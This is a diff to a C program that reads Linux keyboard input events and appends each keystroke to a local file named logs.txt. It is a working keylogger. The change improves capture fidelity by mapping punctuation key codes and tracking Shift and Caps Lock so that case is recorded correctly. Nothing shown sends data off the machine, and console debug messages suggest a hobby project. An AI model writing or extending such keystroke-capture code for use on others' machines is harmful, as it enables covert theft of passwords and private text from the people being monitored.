@@ -6,6 +6,7 @@
 #include<fcntl.h>
 #include<sys/ioctl.h>
 #include<ctype.h>
+#include<stdbool.h>
 #define KEY_RELEASE 0
 #define KEY_IS_PRESSED 1
 #define KEY_KEEPING_PRESSED 2
@@ -15,21 +16,74 @@
 /* 
  * Convert input stream key code to printable character and save to log file 
  */
-static void print_code(int code) {
+static void print_code(int code, bool uppercase) {
 	struct parse_event *p;
 	for (p = key_events; p->name != NULL; p++) {
 		if (p->value == (unsigned) code) {
 			char keycopy[40];
-		
+			bool specialCase = true;	
 			// Handle special cases (spaces, enter, etc)		
 			switch(p->value) {
+				case 12:
+				case 74:
+					 strcpy(keycopy, "-");
+					 break;
+				case 13:
+				case 117:
+					 strcpy(keycopy, "=");
+					 break;
+				case 26:
+					 strcpy(keycopy, "[");
+					 break;
+				case 27:
+					 strcpy(keycopy, "]");
+					 break;
 				case 28: strcpy(keycopy, "\n");
 					 break;
-				case 57: strcpy(keycopy, " ");
+				case 39:
+					 strcpy(keycopy, ";");
 					 break;
-				default: strncpy(keycopy, &p->name[4], 40); // Chops off 'KEY_'
+				case 40:
+					 strcpy(keycopy, "'");
+					 break;
+				case 41:
+					 strcpy(keycopy, "`");
+					 break;
+				case 42:
+				case 54: 
+					 return;
+				case 43:
+					 strcpy(keycopy, "\\");
+					 break;
+				case 51:
+					 strcpy(keycopy, ",");
+					 break;
+				case 52: 
+				case 83:
+					 strcpy(keycopy, ".");
+					 break;
+				case 53:
+				case 98:
+					 strcpy(keycopy, "/");
+					 break;
+				case 57: 
+				case 96:
+					 strcpy(keycopy, " ");
+					 break;
+				default:
+					 strncpy(keycopy, &p->name[4], 40); // Chops off 'KEY_'
+					 specialCase = false;
 			}	
 
+			// Convert to lowercase if needed
+			if (!uppercase && !specialCase) {
+				for (int i = 0; keycopy[i]!='\0'; i++) {
+					keycopy[i] = keycopy[i] + 32;
+				}
+			}
+
+			printf("%s\n", keycopy);	
+			
 			// Open log file
 			FILE *fp;
 			fp = fopen("logs.txt", "a");
@@ -67,6 +121,8 @@ int main(int argc, char *argv[]) {
 		return 1;
 	}
 
+	bool uppercase = false; // determine if input is upper or lowercase
+	bool shiftHeld = false; // determine if shiftkey is being held
  	// Create a listener to the input stream
 	while (1) {
 
@@ -92,8 +148,27 @@ int main(int argc, char *argv[]) {
 		
 				// Essentially skips the events fired before and after a key press
         			// this way only the pressed key value is shown
+				
+				// Handle shift key event
+				if ( (evt[i].code == KEY_RIGHTSHIFT || evt[i].code == KEY_LEFTSHIFT)) {
+					if(!shiftHeld){
+						shiftHeld = true;
+						uppercase = !uppercase;
+						printf("You are holding shift: %s \n", uppercase ? "true" : "false");
+					}
+				} else {
+					shiftHeld = false;
+				}	
+
 				if ((evt[i].value == KEY_IS_PRESSED) || (evt[i].value == KEY_KEEPING_PRESSED)) {
-					print_code(evt[i].code);
+					//print_code(evt[i].code, uppercase);
+					
+					if(evt[i].code == KEY_CAPSLOCK) {
+						uppercase = !uppercase;
+						printf("You hit capslock: %s \n", uppercase ? "true" : "false");
+					} else {
+						print_code(evt[i].code, uppercase);
+					}
 				}
 			}
 		}
